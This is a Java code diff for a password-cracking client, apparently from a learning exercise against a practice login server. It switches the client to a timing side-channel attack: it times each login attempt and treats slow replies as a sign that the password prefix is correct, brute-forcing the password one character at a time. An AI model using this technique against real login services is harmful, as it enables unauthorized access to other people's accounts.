@@ -3,11 +3,14 @@ package hacker.app;
 import hacker.auth.Login;
 import hacker.auth.Req;
 import hacker.auth.RotDial;
+import hacker.models.AuthResp;
 import hacker.models.UserCredentials;
+import hacker.util.iter.PeekingIterator;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
+import java.util.List;
 import java.util.stream.Collectors;
 
 public final class App {
@@ -57,18 +60,29 @@ public final class App {
         // Crack the password
         var padlock = RotDial.constructDialsAsm(1);
         for (var foundPwd = false; !foundPwd; ) {
-          String curPwd = padlock.stream()
-              .map(pIter -> pIter.peek().toString())
-              .collect(Collectors.joining());
-          var response = hacker.auth.Req.authenticate(dataIn, dataOut,
-              crackedCredentials.withPassword(curPwd));
+          String curPwd = displayPwdPrefix(padlock);
+          var curCredentials = crackedCredentials.withPassword(curPwd);
+          final AuthResp response;
+          final boolean isPrefixGood;
+          {
+            var start = System.nanoTime();
+            response = Req.authenticate(dataIn, dataOut, curCredentials);
+            var reqNanoDuration = System.nanoTime() - start;
+            isPrefixGood =
+                (reqNanoDuration / 1_000_000) > 0; // more than 1 milisec
+            System.err.println("Req took: " + reqNanoDuration + ". Denoted as "
+                + isPrefixGood);
+          }
           switch (response.message()) {
             case "Wrong password!":
-              padlock.get(padlock.size() - 1).next();
-              break;
-            case "Exception happened during login":
-              // Found the first characters
-              padlock.add(RotDial.construct());
+              if (isPrefixGood) {
+                // Found the first characters
+                System.err.printf("Expanded password prefix = %s\n",
+                    displayPwdPrefix(padlock));
+                padlock.add(RotDial.construct());
+              } else {
+                padlock.get(padlock.size() - 1).next();
+              }
               break;
             case "Connection success!":
               crackedCredentials = crackedCredentials.withPassword(curPwd);
@@ -90,4 +104,12 @@ public final class App {
       throw e;
     }
   }
+
+  private static String displayPwdPrefix(
+      List<PeekingIterator<Character>> padlock) {
+    return padlock.stream()
+        .map(pIter -> pIter.peek().toString())
+        .collect(Collectors.joining());
+  }
+
 }
